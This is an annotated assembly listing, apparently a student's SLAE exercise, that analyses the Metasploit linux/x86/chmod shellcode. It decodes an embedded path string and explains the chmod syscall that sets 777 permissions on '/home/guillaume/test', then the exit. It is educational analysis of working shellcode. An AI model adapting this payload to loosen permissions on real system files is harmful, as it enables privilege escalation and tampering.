; Metasploit linux/x86/chmod
; Analysis by Guillaume Kaddouch
; SLAE-681

global _start

section .text

_start:
	; chmod
	; chmod(const char *path, mode_t mode)

	cdq
	push byte 0xf			; 0xf = 15 = chmod()
	pop eax				; prepare eax for chmod() syscall
	push edx
	call dword 0x1f		; call shellcode+31

	; below is a string misinterpreted as assembly by nasm
	das
	push dword 0x2f656d6f
	jnz 0x7c
	insb
	insb
	popad
	jnz 0x85
	gs das
	jz 0x81
	jnc 0x92
	add [ebx+0x68],bl
	inc dword [ecx]
	add [eax],al

	; opcodes of assembly chunk above is:
	; \x2f\x68\x6f\x6d\x65\x2f\x67\x75\x69\x6c\x6c\x61\x75\x6d\x65\x2f\x74\x65\x73\x74\x00
	; $ echo [chunk] | sed 's/x//g' | sed 's/\\//g' = 2f686f6d652f6775696c6c61756d652f7465737400
	; $ ./hex2reversestring.py 2f686f6d652f6775696c6c61756d652f7465737400
	; = '/home/guillaume/test'

	; this assembly chunk is the end of a string and the begining of code (misinterpreted by nasm)
	; 0000001E  005B68            add [ebx+0x68],bl
	; 00000021  FF01              inc dword [ecx]
	; 00000023  0000              add [eax],al

	; thanks to gdb and edb debugguers, we know the correct code, see below (2 lines)
	; 00 end of above string
	; above call shellcode+31 jumps below
	pop ebx				; \x5B -> 1st arg: store *path in ebx (file to chmod)
	push 0x01ff			; \x68\xFF\x01\x00\x00 -> 0x1ff = 777 octal (file's permissions)

	pop ecx				; 2nd arg: ecx = 777 octal
	int 0x80			; eax = chmod(*path, 777), *path = /home/guillaume/test

	; exit()
	push byte 0x1
	pop eax
	int 0x80

